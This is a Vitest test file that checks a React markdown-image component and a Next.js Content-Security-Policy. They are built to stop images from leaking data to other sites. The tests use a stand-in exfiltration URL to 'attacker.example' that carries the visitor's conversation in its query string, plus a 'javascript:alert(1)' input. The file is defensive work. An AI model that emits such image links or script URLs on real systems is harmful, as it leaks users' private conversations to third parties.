import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import nextConfig, { CONTENT_SECURITY_POLICY } from "../../../../next.config";
import { MarkdownImage } from "./markdown-image";

function render(props: { src?: string; alt?: string }) {
  return renderToStaticMarkup(createElement(MarkdownImage, props));
}

describe("MarkdownImage", () => {
  const LEAK = "https://attacker.example/x.png?q=the+visitor%27s+conversation";

  it("shows an image as a link, so nothing loads without a click", () => {
    const html = render({ src: LEAK, alt: "Chart" });

    expect(html).not.toContain("<img");
    expect(html).toContain("<a ");
    expect(html).toContain(">Chart</a>");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it("gives an image without alt text a plain label", () => {
    expect(render({ src: LEAK })).toContain(">Image link</a>");
  });

  it.each(["javascript:alert(1)", "data:text/html,hi", "not a url"])(
    "shows no link for %s",
    (src) => {
      const html = render({ src, alt: "Chart" });

      expect(html).toBe("<span>Chart</span>");
    },
  );
});

describe("Content-Security-Policy", () => {
  it("applies to every path and blocks images from other sites", async () => {
    const rules = (await nextConfig.headers?.()) ?? [];

    expect(rules).toEqual([
      {
        source: "/:path*",
        headers: [{ key: "Content-Security-Policy", value: CONTENT_SECURITY_POLICY }],
      },
    ]);
    expect(CONTENT_SECURITY_POLICY).toContain("img-src 'self' data: blob:");
    expect(CONTENT_SECURITY_POLICY).not.toContain("https:");
  });
});
